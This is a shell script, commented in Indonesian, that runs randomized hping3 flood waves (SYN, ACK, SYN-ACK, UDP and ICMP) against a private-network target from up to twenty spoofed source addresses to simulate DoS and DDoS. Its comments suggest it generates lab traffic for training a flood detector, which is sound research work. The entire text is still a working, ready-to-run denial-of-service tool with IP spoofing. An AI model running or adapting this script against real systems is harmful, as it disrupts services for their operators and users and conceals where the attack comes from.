#!/bin/sh
# serang_flood.sh — jalankan di Penyerang-1. Satu sesi = banyak gelombang
# flood dengan parameter acak, sebagian dari BANYAK sumber sekaligus
# (supaya unique_src_ip_per_dst tidak lagi konstan 1 -> benar-benar "DDoS").
#   sh alias_ip.sh 192.168.20 11 30
#   nohup sh serang_flood.sh 1800 > /tmp/flood.log 2>&1 &

TARGET=192.168.30.10
LAMA=${1:-1800}
SELESAI=$(( $(date +%s) + LAMA ))
rnd() { shuf -i "$1-$2" -n 1; }

while [ "$(date +%s)" -lt "$SELESAI" ]; do
  case $(rnd 1 6) in                      # jenis flood
    1|2) MODE="-S" ;;          # SYN flood
    3)   MODE="-A" ;;          # ACK flood
    4)   MODE="-S -A" ;;       # SYN-ACK
    5)   MODE="--udp" ;;       # UDP flood
    6)   MODE="--icmp" ;;      # ICMP flood
  esac
  case $(rnd 1 4) in                      # port tujuan
    1|2) DPORT=80 ;; 3) DPORT=443 ;; 4) DPORT=$(rnd 1 1024) ;;
  esac
  if [ $(rnd 1 3) -eq 1 ]; then LAJU="--flood"; else LAJU="-i u$(rnd 50 20000)"; fi
  DATA=$(rnd 0 1200)                      # ukuran payload acak -> avg_packet_size bervariasi
  DURASI=$(rnd 10 60)
  NSRC=$(rnd 1 20)                        # 1 = DoS, >1 = DDoS
  echo "$(date +%s) hping3 $MODE -p $DPORT $LAJU -d $DATA x$NSRC sumber selama ${DURASI}s"
  k=0
  while [ $k -lt $NSRC ]; do
    timeout "$DURASI" hping3 $MODE -p "$DPORT" $LAJU -d "$DATA" -a "192.168.20.$(rnd 10 30)" "$TARGET" >/dev/null 2>&1 &
    k=$((k + 1))
  done
  wait
  sleep "$(rnd 5 45)"
done
